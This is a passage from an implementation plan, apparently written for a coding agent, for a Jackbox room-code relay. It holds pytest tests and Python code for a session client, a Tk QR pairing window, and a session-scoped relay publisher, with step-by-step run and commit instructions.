    assert waiter.poll() == PairingWaiter.TIMED_OUT


def test_a_failed_poll_does_not_end_the_wait():
    # A one-second blip while the user is fumbling with the camera must not
    # close the window. Only the deadline does that.
    clock = Clock(0.0)
    attempts = []

    def flaky():
        attempts.append(1)
        if len(attempts) < 3:
            raise urllib.error.URLError("connection reset")
        return 1

    waiter = PairingWaiter(flaky, now=clock, timeout=120.0)
    assert waiter.poll() == PairingWaiter.WAITING
    assert waiter.error is not None
    assert waiter.poll() == PairingWaiter.WAITING
    assert waiter.poll() == PairingWaiter.PAIRED
    assert waiter.error is None


def test_the_waiter_reports_the_time_it_has_left():
    clock = Clock(0.0)
    waiter = PairingWaiter(lambda: 0, now=clock, timeout=120.0)
    assert waiter.remaining() == 120.0
    clock.t = 30.0
    assert waiter.remaining() == 90.0
    clock.t = 500.0
    assert waiter.remaining() == 0.0


# --- the urllib transport itself ----------------------------------------

def test_the_transport_builds_an_authenticated_request(monkeypatch):
    captured = {}

    class FakeResponse:
        def __enter__(self):
            return self

        def __exit__(self, *exc_info):
            return False

        def read(self):
            return json.dumps({"subscribers": 3}).encode()

    def fake_urlopen(request, timeout=None):
        captured["request"] = request
        captured["timeout"] = timeout
        return FakeResponse()

    monkeypatch.setattr(host_session.urllib.request, "urlopen", fake_urlopen)
    body = host_session._urllib_call(
        "https://relay.example/sessions/sess-1", "GET", "pub-token"
    )
    request = captured["request"]
    assert request.get_method() == "GET"
    assert request.get_header("Authorization") == "Bearer pub-token"
    assert body == {"subscribers": 3}
    assert captured["timeout"] == host_session.REQUEST_TIMEOUT_SECONDS


def test_the_transport_sends_no_authorization_header_when_there_is_no_token(
    monkeypatch,
):
    captured = {}

    class FakeResponse:
        def __enter__(self):
            return self

        def __exit__(self, *exc_info):
            return False

        def read(self):
            return b""

    def fake_urlopen(request, timeout=None):
        captured["request"] = request
        return FakeResponse()

    monkeypatch.setattr(host_session.urllib.request, "urlopen", fake_urlopen)
    assert host_session._urllib_call("https://relay.example/sessions", "POST",
                                     None) is None
    assert captured["request"].get_header("Authorization") is None


# --- the client/server seam ---------------------------------------------
# Everywhere above, the transport is faked. These run the real client against
# the real app so a route change, a header change or a key rename cannot pass
# the suite. The scheme downgrade is the only thing altered.


def downgrading_call(url, method, token):
    return host_session._urllib_call(
        url.replace("https://", "http://"), method, token
    )


async def test_the_real_client_creates_and_deletes_a_real_session():
    # asyncio.to_thread keeps the blocking urllib call off the loop, so the
    # live server can actually serve it.
    state = RelayState(now=Clock())
    async with serving(build_app(state)) as http:
        base = f"https://127.0.0.1:{http.base_url.port}"
        credentials = await asyncio.to_thread(
            create_session, base, call=downgrading_call
        )
        assert state.session(credentials.session_id) is not None
        assert await asyncio.to_thread(
            delete_session, credentials, call=downgrading_call
        ) is True
        assert state.session(credentials.session_id) is None


async def test_the_real_client_counts_a_real_subscriber():
    state = RelayState(now=Clock())
    async with serving(build_app(state)) as http:
        base = f"https://127.0.0.1:{http.base_url.port}"
        credentials = await asyncio.to_thread(
            create_session, base, call=downgrading_call
        )
        assert await asyncio.to_thread(
            subscriber_count, credentials, call=downgrading_call
        ) == 0
        async with http.stream(
            "GET",
            f"/sessions/{credentials.session_id}/subscribe",
            headers={"Authorization": f"Bearer {credentials.subscriber_token}"},
        ) as response:
            assert response.status_code == 200
            assert await asyncio.to_thread(
                subscriber_count, credentials, call=downgrading_call
            ) == 1
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `.venv/bin/python -m pytest tests/test_host_session.py -q`
Expected: `ModuleNotFoundError: No module named 'host'`.

- [ ] **Step 3: Write `host/__init__.py` and `host/session.py`**

`host/__init__.py` is empty — it exists so `python3 -m host.qr_window` resolves.

```python
"""Host-side relay client: create a session, watch for a phone, tidy up.

Stdlib only, with an injected transport and clock, so all of it tests without
a network and without a display. Deliberately imports no GUI toolkit: the
window in host/qr_window.py is glue over this, not the other way round.
"""
import argparse
import json
import os
import shlex
import sys
import time
import urllib.request
from dataclasses import dataclass

REQUEST_TIMEOUT_SECONDS = 5.0
PAIRING_TIMEOUT_SECONDS = 120.0
POLL_SECONDS = 1.0


@dataclass(frozen=True)
class SessionCredentials:
    """One game night's relay identity. `base_url` is stored normalised."""

    base_url: str
    session_id: str
    publisher_token: str
    subscriber_token: str


def _normalise(base_url: str) -> str:
    if not isinstance(base_url, str) or not base_url.startswith("https://"):
        raise ValueError(
            "relay base_url must be https:// — TLS is terminated in front of "
            "the relay, so this is the only place it can be enforced"
        )
    return base_url.rstrip("/")


def _checked(value, what: str) -> str:
    """Refuse anything the relay sends that is not a plain opaque token.

    The relay chooses these strings and the host then interpolates them into
    a URL and writes them into a file the launcher sources. `shlex.quote`
    makes the shell side safe on its own, but a value containing `/`, `?` or
    `#` would still rewrite the publish URL. Both are `secrets.token_urlsafe`
    output, so this rejects nothing legitimate.
    """
    if not isinstance(value, str) or not value:
        raise ValueError(f"relay returned an empty {what}")
    # `.isascii()` first: str.isalnum() is true for plenty of non-ASCII.
    if not value.isascii() or not all(
        character.isalnum() or character in "-_" for character in value
    ):
        raise ValueError(f"relay returned an implausible {what}")
    return value


def _urllib_call(url: str, method: str, token: str | None) -> dict | None:
    """One JSON round trip. Returns None for an empty body (a 204)."""
    headers = {"Accept": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    request = urllib.request.Request(url, headers=headers, method=method)
    with urllib.request.urlopen(request, timeout=REQUEST_TIMEOUT_SECONDS) as response:
        body = response.read()
    return json.loads(body) if body else None


def create_session(base_url: str, *, call=_urllib_call) -> SessionCredentials:
    """Ask the relay for a session. Raises if it cannot be reached.

    The caller degrades — the launcher logs and starts the game LAN-only. This
    function does not, because "no session" and "a session that silently does
    nothing" are very different things to the layer above.
    """
    base = _normalise(base_url)
    body = call(f"{base}/sessions", "POST", None)
    return SessionCredentials(
        base_url=base,
        session_id=_checked(body["session_id"], "session id"),
        publisher_token=_checked(body["publisher_token"], "publisher token"),
        subscriber_token=_checked(body["subscriber_token"], "subscriber token"),
    )


def qr_payload(credentials: SessionCredentials) -> str:
    """The URL the phone scans.

    The subscriber token sits in the fragment, which browsers never transmit,
    so it cannot reach the relay's access log, a proxy log or a Referer header.
    The publisher token never leaves the host PC.
    """
    return (
        f"{credentials.base_url}/j"
        f"#{credentials.session_id}.{credentials.subscriber_token}"
    )


def subscriber_count(credentials: SessionCredentials, *, call=_urllib_call) -> int:
    body = call(
        f"{credentials.base_url}/sessions/{credentials.session_id}",
        "GET",
        credentials.publisher_token,
    )
    return int(body["subscribers"])


def delete_session(credentials: SessionCredentials, *, call=_urllib_call) -> bool:
    """Free the session's capacity. Never raises: this runs on an exit path."""
    try:
        call(
            f"{credentials.base_url}/sessions/{credentials.session_id}",
            "DELETE",
            credentials.publisher_token,
        )
    except Exception:
        return False
    return True


def write_session_env(path, credentials: SessionCredentials) -> None:
    """Write the game's credentials at mode 600, for the launcher to source.

    A file rather than arguments: a command line is world-readable through
    `ps`, and this token can publish to the session. Only the *publisher*
    token goes in — the extractor publishes and has no business subscribing.
    """
    text = (
        f"JBVIP_SESSION_ID={shlex.quote(credentials.session_id)}\n"
        f"JBVIP_SESSION_TOKEN={shlex.quote(credentials.publisher_token)}\n"
    )
    handle = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(handle, "w") as file:
        file.write(text)


def credentials_from_env(environ=None) -> SessionCredentials | None:
    """Rebuild credentials the launcher exported. None if any part is missing.

    The subscriber token is not in the environment and is not needed here —
    only `delete_session` uses this, and deleting is a publisher action.
    """
    environ = os.environ if environ is None else environ
    base_url = environ.get("JBVIP_RELAY_URL", "")
    session_id = environ.get("JBVIP_SESSION_ID", "")
    token = environ.get("JBVIP_SESSION_TOKEN", "")
    if not (base_url and session_id and token):
        return None
    try:
        base = _normalise(base_url)
    except ValueError:
        return None
    return SessionCredentials(
        base_url=base,
        session_id=session_id,
        publisher_token=token,
        subscriber_token="",
    )


class PairingWaiter:
    """Poll until a phone subscribes, or give up.

    Owns no clock, no display and no sleep of its own: `now` and `count` are
    injected, so the whole poll-and-timeout behaviour is a unit test.
    """

    WAITING = "waiting"
    PAIRED = "paired"
    TIMED_OUT = "timed-out"

    def __init__(self, count, *, now=time.monotonic,
                 timeout: float = PAIRING_TIMEOUT_SECONDS):
        self._count = count
        self._now = now
        self._deadline = now() + timeout
        self.state = self.WAITING
        self.subscribers = 0
        self.error: str | None = None

    def poll(self) -> str:
        """One tick. WAITING means call again later."""
        if self.state != self.WAITING:
            return self.state
        try:
            self.subscribers = self._count()
        except Exception as exc:
            # A blip must not end the wait; only the deadline does.
            self.error = str(exc)
        else:
            self.error = None
            if self.subscribers >= 1:
                self.state = self.PAIRED
                return self.state
        if self._now() >= self._deadline:
            self.state = self.TIMED_OUT
        return self.state

    def remaining(self) -> float:
        return max(0.0, self._deadline - self._now())


def main(argv=None) -> int:
    """`python3 -m host.session --delete`, called from the launcher's cleanup.

    Reads the credentials from the environment rather than arguments, so the
    token never appears in a process listing.
    """
    parser = argparse.ArgumentParser(description="jbvip relay session helper")
    parser.add_argument(
        "--delete", action="store_true",
        help="delete the session named by JBVIP_SESSION_ID and exit",
    )
    args = parser.parse_args(argv)
    if not args.delete:
        parser.error("nothing to do; pass --delete")
    credentials = credentials_from_env()
    if credentials is not None:
        delete_session(credentials)
    # Always 0. This runs inside the launcher's EXIT trap, where a non-zero
    # status would change the exit code the game reported to Steam. The
    # session self-expires anyway, so a failed delete costs nothing.
    return 0


if __name__ == "__main__":  # pragma: no cover - exercised by the launcher
    sys.exit(main())
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `.venv/bin/python -m pytest tests/test_host_session.py -q` — expected PASS.
Then `.venv/bin/python -m pytest -q` — whole suite green.

- [ ] **Step 5: Confirm the module pulls in no GUI toolkit**

```bash
.venv/bin/python -c "import sys, host.session; assert 'tkinter' not in sys.modules; print('no tkinter')"
```

Expected: `no tkinter`. If this fails, something in `host/session.py` imported the window module.

- [ ] **Step 6: Commit**

```bash
git add host/__init__.py host/session.py tests/test_host_session.py
git commit -m "feat(host): add the relay session client and pairing waiter

Stdlib only, injected transport and clock, so the create/poll/delete cycle
and the timeout behaviour test without a network or a display. The
subscriber token is only ever emitted into the QR fragment; the session env
file carries the publisher token at mode 600, because a command line is
world-readable."
```

---

### Task 4: `host/qr_window.py` — the window

Spec §5.4. Thin Tk glue over Task 3 and the one piece with no automated test — it is verified by running it. Keep it dumb: if you find yourself wanting to test something here, it belongs in `host/session.py`.

**Files:**
- Create: `host/qr_window.py`

**Interfaces:**
- Consumes, from Task 3: `SessionCredentials`, `create_session`, `qr_payload`, `subscriber_count`, `write_session_env`, `PairingWaiter`, `PAIRING_TIMEOUT_SECONDS`, `POLL_SECONDS`.
- Produces, for Task 6: the CLI `python3 -m host.qr_window --base-url <URL> --session-env <PATH>`, exiting **0** when a session exists (paired, skipped or timed out — all fine, the game should launch) and **non-zero only when the session could not be created**.

- [ ] **Step 1: Write `host/qr_window.py`**

```python
"""The pairing window: show a QR, wait for a phone, get out of the way.

Deliberately thin. Every decision — when to stop waiting, what the payload
looks like, what a failed poll means — lives in host/session.py, which tests
without a display. This file is Tk plumbing and is verified by running it.

Shown before the game launches rather than over it: fighting a fullscreen
game for stacking order under Wayland is unreliable, and the launcher already
has a natural gap here while mitmproxy starts.
"""
import argparse
import shutil
import subprocess
import sys
import tempfile
import tkinter as tk
from pathlib import Path

from host.session import (
    PAIRING_TIMEOUT_SECONDS,
    POLL_SECONDS,
    PairingWaiter,
    create_session,
    qr_payload,
    subscriber_count,
    write_session_env,
)

QR_MODULE_PIXELS = 8
QR_MARGIN_MODULES = 2


def render_qr_png(payload: str, path) -> bool:
    """Write a PNG of `payload` to `path`. False when qrencode is unavailable.

    Tk 8.6 reads PNG natively, so this needs no Pillow — one binary
    dependency instead of a Python one.

    The payload goes in on **stdin**, never as an argument: it carries the
    subscriber token, and an argument would be world-readable in
    /proc/<pid>/cmdline for as long as qrencode ran. qrencode reads standard
    input when given no string operand.
    """
    if shutil.which("qrencode") is None:
        return False
    try:
        subprocess.run(
            [
                "qrencode", "-t", "PNG",
                "-s", str(QR_MODULE_PIXELS),
                "-m", str(QR_MARGIN_MODULES),
                "-o", str(path),
            ],
            input=payload.encode(),
            check=True, capture_output=True, timeout=10,
        )
    except (subprocess.SubprocessError, OSError):
        return False
    return True


def show(credentials, *, count=None, timeout=PAIRING_TIMEOUT_SECONDS) -> str:
    """Display the QR until a phone pairs, the user skips, or time runs out.

    Returns the PairingWaiter state it finished in. Never raises for a
    pairing failure — only Tk itself can fail here, and that is the caller's
    problem to log.
    """
    counter = count or (lambda: subscriber_count(credentials))
    waiter = PairingWaiter(counter, timeout=timeout)
    payload = qr_payload(credentials)

    root = tk.Tk()
    root.title("jbvip — scan to pair your phone")
    root.attributes("-topmost", True)
    frame = tk.Frame(root, padx=24, pady=24)
    frame.pack()

    # The PNG *is* the subscriber credential in visual form.
    # TemporaryDirectory creates it at mode 0700 and removes the whole tree
    # on the way out, so it is never readable by another user and never
    # outlives the window.
    with tempfile.TemporaryDirectory(prefix="jbvip-qr.") as workspace:
        image = None
        png = Path(workspace) / "pair.png"
        if render_qr_png(payload, png):
            image = tk.PhotoImage(file=str(png))
            tk.Label(frame, image=image).pack()
        else:
            # Worse, but not broken: the user can still type it in.
            tk.Label(
                frame, text="qrencode is not installed — open this URL:",
                font=("TkDefaultFont", 10),
            ).pack()
            entry = tk.Entry(frame, width=52, justify="center")
            entry.insert(0, payload)
            entry.configure(state="readonly")
            entry.pack(pady=(4, 0))

        status = tk.Label(frame, text="", font=("TkDefaultFont", 11))
        status.pack(pady=(12, 8))
        tk.Button(frame, text="Skip", width=12, command=root.destroy).pack()

        def tick():
            state = waiter.poll()
            if state == PairingWaiter.WAITING:
                seconds = int(waiter.remaining())
                trouble = " (relay not responding)" if waiter.error else ""
                status.configure(
                    text=f"Waiting for a phone… {seconds}s{trouble}"
                )
                root.after(int(POLL_SECONDS * 1000), tick)
                return
            root.destroy()

        root.protocol("WM_DELETE_WINDOW", root.destroy)
        root.after(0, tick)
        # `image` must stay referenced for as long as the window lives: Tk
        # does not hold a reference and the PNG is garbage collected out from
        # under it otherwise, leaving a blank label.
        root.image = image
        root.mainloop()

    return waiter.state


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        description="Create a relay session and show its pairing QR code"
    )
    parser.add_argument("--base-url", required=True, help="https:// relay URL")
    parser.add_argument(
        "--session-env", required=True,
        help="path to write JBVIP_SESSION_ID/JBVIP_SESSION_TOKEN into",
    )
    args = parser.parse_args(argv)

    try:
        credentials = create_session(args.base_url)
    except Exception as exc:
        # A dead VPS must never cost a game night.
        print(
            f"jbvip: no relay session ({exc}); the game will run LAN-only",
            file=sys.stderr,
        )
        return 1
    write_session_env(args.session_env, credentials)

    try:
        state = show(credentials)
    except tk.TclError as exc:
        # No display, or a Tk that will not start. The session is live and
        # publishing will work, so this is not fatal.
        print(f"jbvip: could not open the pairing window ({exc})", file=sys.stderr)
        return 0
    if state != PairingWaiter.PAIRED:
        print(f"jbvip: no phone paired ({state}); starting anyway", file=sys.stderr)
    return 0


if __name__ == "__main__":  # pragma: no cover - a window, verified by hand
    sys.exit(main())
```

- [ ] **Step 2: Verify the window by hand, with no relay**

This is the step that cannot be automated. Write a throwaway driver in the scratchpad (**not** in the repo):

```bash
cat > /tmp/claude-1000/-home-nevenit-Programming-C--JackBoxAutoVIPServer/c3328ef4-0d4b-46ad-aba9-ef9790c59c46/scratchpad/qr-demo.py <<'PY'
import sys
sys.path.insert(0, "/home/nevenit/Programming/C#/JackBoxAutoVIPServer")
from host.qr_window import show
from host.session import SessionCredentials

credentials = SessionCredentials(
    base_url="https://relay.example",
    session_id="demoSessionId",
    publisher_token="demo-publisher",
    subscriber_token="demo-subscriber-token-that-is-realistically-long",
)
# Flip this to `lambda: 1` to check the paired path, or pass timeout=5 for
# the timeout path.
print("finished in state:", show(credentials, count=lambda: 0, timeout=15))
PY
.venv/bin/python /tmp/claude-1000/-home-nevenit-Programming-C--JackBoxAutoVIPServer/c3328ef4-0d4b-46ad-aba9-ef9790c59c46/scratchpad/qr-demo.py
```

Check, and report to the user:
- A window appears, on top, with a scannable QR code (`qrencode` is installed at `/usr/bin/qrencode`, so the fallback should not trigger).
- The status line counts down once a second.
- **Scan it with a real phone camera** and confirm the URL reads `https://relay.example/j#demoSessionId.demo-subscriber-token-…`. This is the one check nothing else in the plan can make.
- Skip closes the window immediately. The reported state is `waiting`, which is correct — `show()` reports where the waiter got to, and `main()` only distinguishes `paired` from everything else.
- Re-run with `count=lambda: 1` → closes almost immediately, state `paired`.
- Re-run with `timeout=5` → closes after five seconds, state `timed-out`.
- Run with `PATH=/usr/bin:/bin` minus qrencode (easiest: `PATH=/nonexistent .venv/bin/python …`) → the fallback shows a selectable URL rather than crashing.
- With the window open, `ps -ww -C qrencode` and `grep -c demo-subscriber /proc/*/cmdline 2>/dev/null` find nothing — the payload went in on stdin.

Report what you observed to the user, including anything that looked wrong. This step is why Task 4 exists as its own task.

- [ ] **Step 3: Commit**

```bash
git add host/qr_window.py
git commit -m "feat(host): show a pairing QR code before the game starts

Tk glue over host.session: qrencode renders the PNG from stdin so the
subscriber token never reaches a command line, Tk 8.6 reads PNG natively
so there is no Pillow dependency, and the window closes on a phone
arriving, on Skip, or after 120 seconds."
```

---

### Task 5: session-scope the extractor

Spec §5.5 and §5.6. Small code change, careful failure semantics.

**Files:**
- Modify: `extractor/relay_publisher.py`
- Modify: `tests/test_relay_publisher.py`
- Modify: `extractor/addon.py` — `_build_sinks()` only
- Modify: `tests/test_addon.py` — the `_build_sinks` block only (currently lines 353–411)
- Modify: `tests/test_relay_app.py` — append the seam tests

**Interfaces:**
- Consumes, from Task 2: the `POST /sessions/{id}/publish` route and its 404/401 split.
- Produces, for Task 6: `RelayPublisher(base_url, session_id, token, *, post=..., attempts=3, backoff=0.5, sleep=..., now=...)`; the three environment variables `JBVIP_RELAY_URL`, `JBVIP_SESSION_ID`, `JBVIP_SESSION_TOKEN`; `LOG_MARKER` unchanged at `"jbvip-relay:"`.

**The failure taxonomy — get this right, it is the substance of the task.** `set_code` is called **once per websocket frame** on Blobcast packs with the same code, and a failed publish is deliberately *not* recorded as sent so a blip cannot suppress a code for the rest of the session. Those two facts together mean a permanent failure retries and logs at frame rate unless it is latched:

| Relay says | Meaning | Behaviour |
|---|---|---|
| 204 | delivered | Record as sent. |
| 401 / 403 / 404 / 410 | the session is gone or the token is wrong | **Latch dead.** Log once, never attempt again this process. Neither can fix itself. |
| 400 | this *code* was refused | Do not retry, do not latch. Record as sent so the next frame does not re-offer it; a different code may well be fine. |
| 429, 5xx, connection errors | transient | Retry with backoff, do not record as sent. A reverse-proxy 502 must still recover. |

- [ ] **Step 1: Write the failing tests**

Amend `tests/test_relay_publisher.py`: every `RelayPublisher(...)` call gains a session id, and add the block below. `urllib.error` is already imported there.

```python
def make(post, **kwargs):
    return RelayPublisher(
        "https://relay.example/",
        "sess-1",
        "pub-token",
        post=post,
        sleep=no_sleep,
        now=lambda: 1000.0,
        **kwargs,
    )


def http_error(code):
    return urllib.error.HTTPError(
        "https://relay.example/sessions/sess-1/publish", code, "nope", {}, None
    )


class RejectingPost:
    """Raises `exception` for the listed codes, accepts every other one."""

    def __init__(self, reject, exception):
        self.calls = []
        self.reject = set(reject)
        self.exception = exception

    def __call__(self, url, token, payload):
        self.calls.append((url, token, payload))
        if payload["code"] in self.reject:
            raise self.exception


async def test_the_publish_url_is_scoped_to_the_session():
    post = RecordingPost()
    await make(post).set_code("WEWW")
    assert post.calls[0][0] == "https://relay.example/sessions/sess-1/publish"


def test_an_empty_session_id_is_refused():
    with pytest.raises(ValueError):
        RelayPublisher("https://relay.example", "", "pub-token")


async def test_a_session_that_no_longer_exists_stops_the_publisher_for_good():
    post = RecordingPost(failures=99, exception=http_error(404))
    publisher = make(post)
    await publisher.set_code("WEWW")
    assert len(post.calls) == 1  # a 404 is not retried
    await publisher.set_code("ZZZZ")
    assert len(post.calls) == 1  # and nothing is attempted afterwards


async def test_a_dead_session_is_reported_once_not_once_per_frame(caplog):
    # Blobcast calls set_code once per websocket frame with the same code, and
    # a failed publish is deliberately not recorded as sent. Without the latch
    # this logs and retries at frame rate for the rest of the game.
    post = RecordingPost(failures=99, exception=http_error(404))
    publisher = make(post)
    with caplog.at_level("WARNING"):
        for _ in range(50):
            await publisher.set_code("WEWW")
    assert len(post.calls) == 1
    assert caplog.text.count(LOG_MARKER) == 1


@pytest.mark.parametrize("code", [401, 403, 410])
async def test_every_permanent_refusal_latches(code):
    post = RecordingPost(failures=99, exception=http_error(code))
    publisher = make(post)
    await publisher.set_code("WEWW")
    await publisher.set_code("ZZZZ")
    assert len(post.calls) == 1


async def test_a_refused_code_is_not_retried_but_does_not_kill_the_publisher():
    # 400 means "that code is implausible", not "this session is finished".
    post = RejectingPost({"WEWW"}, http_error(400))
    publisher = make(post)
    await publisher.set_code("WEWW")
    await publisher.set_code("WEWW")
    await publisher.set_code("ZZZZ")
    assert [call[2]["code"] for call in post.calls] == ["WEWW", "ZZZZ"]


@pytest.mark.parametrize("code", [429, 500, 502, 503])
async def test_a_transient_status_is_still_retried(code):
    # A reverse-proxy blip or a rate limit must recover, so these keep the
    # backoff they have always had.
    post = RecordingPost(failures=2, exception=http_error(code))
    await make(post).set_code("WEWW")
    assert len(post.calls) == 3


async def test_the_room_code_is_never_logged_when_the_session_dies(caplog):
    post = RecordingPost(failures=99, exception=http_error(404))
    with caplog.at_level("DEBUG"):
        await make(post).set_code("SECRET1")
    assert "SECRET1" not in caplog.text
```

The existing `test_set_code_posts_to_the_publish_endpoint` is replaced by `test_the_publish_url_is_scoped_to_the_session`; every other existing test in the file keeps its assertions and only changes through the new `make()`.

Rewrite `tests/test_addon.py` lines 353–411 as (`pytest` is already imported there):

```python
RELAY_ENVIRONMENT = {
    "JBVIP_RELAY_URL": "https://relay.example",
    "JBVIP_SESSION_ID": "sess-1",
    "JBVIP_SESSION_TOKEN": "pub-token",
}


def set_relay_env(monkeypatch, **overrides):
    for name in RELAY_ENVIRONMENT:
        monkeypatch.delenv(name, raising=False)
    for name, value in {**RELAY_ENVIRONMENT, **overrides}.items():
        if value is not None:
            monkeypatch.setenv(name, value)


def test_build_sinks_is_lan_only_without_relay_configuration(monkeypatch):
    set_relay_env(monkeypatch, **dict.fromkeys(RELAY_ENVIRONMENT))
    assert [type(s).__name__ for s in addon_module._build_sinks()] == [
        "RoomCodeServer"
    ]


def test_build_sinks_adds_the_relay_when_all_three_are_set(monkeypatch):
    set_relay_env(monkeypatch)
    assert [type(s).__name__ for s in addon_module._build_sinks()] == [
        "RoomCodeServer",
        "RelayPublisher",
    ]


@pytest.mark.parametrize("missing", list(RELAY_ENVIRONMENT))
def test_build_sinks_names_what_is_missing_when_half_configured(
    monkeypatch, caplog, missing
):
    # Half-configured is otherwise undiagnosable: the user gets a LAN-only
    # setup and the only place it shows is the proxy log.
    set_relay_env(monkeypatch, **{missing: None})
    with caplog.at_level("WARNING"):
        sinks = addon_module._build_sinks()
    assert [type(s).__name__ for s in sinks] == ["RoomCodeServer"]
    assert missing in caplog.text
    assert LOG_MARKER in caplog.text


def test_build_sinks_never_logs_the_token(monkeypatch, caplog):
    set_relay_env(monkeypatch, JBVIP_RELAY_URL=None)
    with caplog.at_level("WARNING"):
        addon_module._build_sinks()
    assert "pub-token" not in caplog.text


def test_build_sinks_says_nothing_when_the_relay_is_simply_not_configured(
    monkeypatch, caplog
):
    set_relay_env(monkeypatch, **dict.fromkeys(RELAY_ENVIRONMENT))
    with caplog.at_level("WARNING"):
        addon_module._build_sinks()
    assert caplog.text == ""


def test_build_sinks_degrades_to_lan_only_on_a_malformed_relay_url(monkeypatch):
    # http:// is refused by RelayPublisher; losing the relay must never cost
    # a game night.
    set_relay_env(monkeypatch, JBVIP_RELAY_URL="http://relay.example")
    assert [type(s).__name__ for s in addon_module._build_sinks()] == [
        "RoomCodeServer"
    ]
```

Append the seam tests to `tests/test_relay_app.py`:

```python
# --- the client/server seam ---------------------------------------------
# Everywhere else the publisher tests inject a fake `post` and the relay tests
# post hand-built JSON, so the agreement between the two sides is asserted
# twice on the same side of the wire, by tests that cannot disagree with each
# other. A payload-key rename, a header change or a route change would pass
# the whole suite. These run the real client against the real app. The scheme
# downgrade is the only thing altered — RelayPublisher refuses a non-https
# base URL, and that check is worth keeping honest.

from extractor import relay_publisher
from extractor.relay_publisher import LOG_MARKER, RelayPublisher


def downgrading_post(url, token, payload):
    relay_publisher._urllib_post(url.replace("https://", "http://"), token, payload)


def real_publisher(http, session_id, token, **kwargs):
    return RelayPublisher(
        f"https://127.0.0.1:{http.base_url.port}",
        session_id,
        token,
        post=downgrading_post,
        **kwargs,
    )


async def test_the_real_publisher_reaches_the_real_relay():
    state, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        publisher = real_publisher(
            http, session["session_id"], session["publisher_token"], now=lambda: 900.0
        )
        await publisher.set_code("WEWW")
    record = state.current_code(session["session_id"])
    assert record.code == "WEWW"
    assert record.ts == 900.0  # the publisher's stamp survived the wire


async def test_the_real_publisher_cannot_reach_another_session():
    state, app = make()
    async with serving(app) as http:
        a, b = await new_session(http), await new_session(http)
        publisher = real_publisher(
            http, a["session_id"], b["publisher_token"], attempts=1
        )
        await publisher.set_code("WEWW")
    assert state.current_code(a["session_id"]) is None
    assert state.current_code(b["session_id"]) is None


async def test_the_real_publisher_latches_when_the_real_session_is_deleted(caplog):
    # The whole 404 contract, end to end: a real HTTPError off a real socket.
    _, app = make()
    async with serving(app) as http:
        session = await new_session(http)
        publisher = real_publisher(
            http, session["session_id"], session["publisher_token"]
        )
        await publisher.set_code("WEWW")
        await http.delete(
            f"/sessions/{session['session_id']}",
            headers=auth(session["publisher_token"]),
        )
        with caplog.at_level("WARNING"):
            await publisher.set_code("ZZZZ")
            await publisher.set_code("YYYY")
    assert caplog.text.count(LOG_MARKER) == 1
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `.venv/bin/python -m pytest tests/test_relay_publisher.py tests/test_addon.py -q`
Expected: `TypeError: __init__() missing 1 required positional argument` from the publisher, and the addon tests failing on the new variables.

- [ ] **Step 3: Modify `extractor/relay_publisher.py`**

Add `import urllib.error` alongside the existing `import urllib.request`, then:

```python
# The relay cannot recover from any of these, and neither can we: the session
# is gone or the credential is wrong. Retrying costs a 5s timeout per attempt
# on the shared executor, once per websocket frame.
PERMANENT_STATUSES = frozenset({401, 403, 404, 410})
```

Constructor gains `session_id` as the second positional parameter:

```python
    def __init__(
        self,
        base_url: str,
        session_id: str,
        token: str,
        *,
        post=_urllib_post,
        attempts: int = DEFAULT_ATTEMPTS,
        backoff: float = DEFAULT_BACKOFF_SECONDS,
        sleep=asyncio.sleep,
        now=time.time,
    ):
        if not base_url.startswith("https://"):
            raise ValueError(
                "relay base_url must be https:// — TLS is terminated in front "
                "of the relay, so this is the only place it can be enforced"
            )
        if not session_id:
            raise ValueError("relay session_id must not be empty")
        if not token:
            raise ValueError("relay token must not be empty")
        self._url = f"{base_url.rstrip('/')}/sessions/{session_id}/publish"
        self._token = token
        self._post = post
        self._attempts = attempts
        self._backoff = backoff
        self._sleep = sleep
        self._now = now
        self._last_sent: str | None = None
        self._dead = False
```

`set_code` and the delivery loop:

```python
    async def set_code(self, code: str) -> None:
        """Publish best-effort. Never raises: a dead relay must not disturb a game.

        Mirrors RoomCodeServer.set_code's repeat guard. One session yields the
        same code from several hooks — the create response and websocket_start
        on ecast, one per frame on Blobcast — and each duplicate costs up to
        three attempts x a 5s timeout on the shared executor.
        """
        if self._dead or code == self._last_sent:
            return
        try:
            if await self._deliver(code):
                self._last_sent = code
        except Exception:
            # Backstop so nothing from this sink can escape into mitmproxy.
            # Deliberately does not log the code itself.
            logger.exception("%s publish failed unexpectedly", LOG_MARKER)

    async def _deliver(self, code: str) -> bool:
        """True when this code should not be offered again.

        That covers the happy path *and* a code the relay refused outright:
        re-offering a code it called implausible would fail identically, once
        per websocket frame. It deliberately does NOT cover a transient
        failure, so one blip cannot suppress a code for the rest of a session.
        """
        payload = {"code": code, "ts": self._now()}
        delay = self._backoff
        for attempt in range(1, self._attempts + 1):
            try:
                await asyncio.to_thread(self._post, self._url, self._token, payload)
                return True
            except urllib.error.HTTPError as exc:
                if exc.code in PERMANENT_STATUSES:
                    self._dead = True
                    # Deliberately does not log the code itself.
                    logger.warning(
                        "%s the relay session is no longer usable (HTTP %s); "
                        "room codes stay LAN-only for the rest of this game",
                        LOG_MARKER,
                        exc.code,
                    )
                    return False
                if exc.code == 400:
                    # This code was refused, not the session. A different code
                    # may still be fine, so do not latch — but never re-offer
                    # this one.
                    logger.warning(
                        "%s the relay refused a room code (HTTP 400)", LOG_MARKER
                    )
                    return True
                failure = exc  # 429 and 5xx are transient; fall through
            except Exception as exc:
                failure = exc
            if attempt >= self._attempts:
                # Deliberately does not log the code itself.
                logger.warning(
                    "%s publish failed after %d attempts: %s",
                    LOG_MARKER,
                    self._attempts,
                    failure,
                )
                return False
            await self._sleep(delay)
            delay *= 2
        return False
```

`urllib.error.HTTPError` subclasses `URLError` subclasses `OSError`, so the `HTTPError` clause **must** come before the bare `Exception` clause.

- [ ] **Step 4: Modify `extractor/addon.py`**

Replace `_build_sinks()`:

```python
RELAY_VARIABLES = ("JBVIP_RELAY_URL", "JBVIP_SESSION_ID", "JBVIP_SESSION_TOKEN")


def _build_sinks():
    """The LAN server always; the relay publisher when it is fully configured.

    Half-configured is loud, because it is otherwise undiagnosable: the user
    gets a LAN-only setup and the only place this is visible is the proxy log.
    jbvip-run.sh normally sets the session variables at launch. Never logs a
